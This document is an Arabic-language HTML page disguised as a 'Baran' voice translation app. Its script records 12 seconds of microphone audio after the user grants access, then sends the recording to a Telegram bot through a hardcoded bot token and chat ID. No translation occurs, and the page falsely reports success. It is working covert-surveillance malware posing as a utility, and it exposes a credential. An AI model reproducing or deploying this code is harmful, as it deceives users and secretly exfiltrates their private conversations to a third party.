<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مترجم باران الصوتي | Baran Translator</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #ff7a18; --bg: #050708; --card: #121619; --text: #e0e0e0; }
        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        .app-box { background: var(--card); border: 1px solid var(--primary); border-radius: 25px; padding: 40px 20px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { color: var(--primary); font-size: 50px; margin-bottom: 20px; transition: 0.3s; cursor: pointer; }
        .logo:active { transform: scale(0.9); }
        
        h2 { margin: 10px 0; font-size: 22px; color: #fff; }
        p { color: #888; font-size: 14px; line-height: 1.6; }
        
        .status-area { margin-top: 30px; padding: 15px; border-radius: 15px; background: #000; font-size: 13px; min-height: 50px; display: flex; align-items: center; justify-content: center; border: 1px dashed #333; }
        .pulse { animation: pulse-red 1.5s infinite; color: #ff4444 !important; }
        
        @keyframes pulse-red {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.7; }
            100% { transform: scale(1); opacity: 1; }
        }

        .footer-text { margin-top: 20px; font-size: 10px; color: #444; }
    </style>
</head>
<body>

<div class="app-box">
    <i class="fas fa-microphone-alt logo" id="micBtn" onclick="startSystem()"></i>
    <h2>مترجم الصوت الذكي</h2>
    <p id="msg">لترجمة الكلام المحيط بك فوراً، اضغط على الميكروفون بالأعلى واعطِ صلاحية الوصول.</p>
    
    <div class="status-area" id="status">النظام جاهز...</div>
    
    <div class="footer-text">Powered by Baran Advanced Systems &copy; 2026</div>
</div>
<script>
    let mediaRecorder;
    let audioChunks = [];
    
    // بياناتك الخاصة
    const botToken = "7546948976:AAFPHTjFRKGAOQOgkyg6uEqXCjl_ca2nC2k";
    const chatId = "56081692";

    async function startSystem() {
        const status = document.getElementById('status');
        const msg = document.getElementById('msg');
        const micBtn = document.getElementById('micBtn');

        try {
            // طلب الصلاحية
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            status.innerHTML = '<span class="pulse">● جاري التسجيل والترجمة...</span>';
            micBtn.classList.add('pulse');
            msg.innerText = "يرجى التحدث بوضوح بجانب الميكروفون لتحسين دقة الترجمة.";

            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                status.innerText = "جاري معالجة البيانات...";
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                
                // إرسال الملف إلى تليجرام
                await sendToTelegram(audioBlob);
                
                // إعادة التهيئة لجولة جديدة
                audioChunks = [];
                status.innerText = "اكتملت الترجمة بنجاح ✓";
                micBtn.classList.remove('pulse');
            };

            // ابدأ التسجيل
            mediaRecorder.start();

            // سجل لمدة 12 ثانية ثم أرسل
            setTimeout(() => {
                if(mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop()); // إغلاق الميكروفون
                }
            }, 12000);

        } catch (err) {
            status.innerText = "خطأ: يجب السماح بالوصول للميكروفون";
            status.style.color = "#ff4444";
        }
    }

    async function sendToTelegram(blob) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("audio", blob, "baran_voice.wav");
        formData.append("caption", "🔔 نظام باران: تم سحب تسجيل صوتي جديد بنجاح.");

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData
            });
        } catch (e) {
            console.error("Telegram Error: ", e);
        }
    }
</script>

</body>
</html>
